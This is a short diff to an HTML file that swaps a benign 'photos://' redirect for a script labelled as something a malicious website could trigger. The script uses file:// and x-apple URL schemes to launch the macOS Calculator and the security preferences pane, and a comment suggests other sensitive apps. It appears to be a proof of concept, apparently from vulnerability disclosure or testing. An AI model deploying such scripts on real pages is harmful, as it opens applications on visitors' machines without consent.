@@ -1,9 +1,7 @@
-<!DOCTYPE html>
-<html>
-<body>
+<!-- Malicious website could automatically trigger -->
 <script>
-window.location.href = 'photos://'; 👈 change this to any you want.
+window.location = "file:///Applications/Calculator.app";
+// or
+window.open("x-apple.systempreferences:com.apple.preference.security");
+// or launch other sensitive apps
 </script>
-<p>Opening photos...</p>
-</body>
-</html>
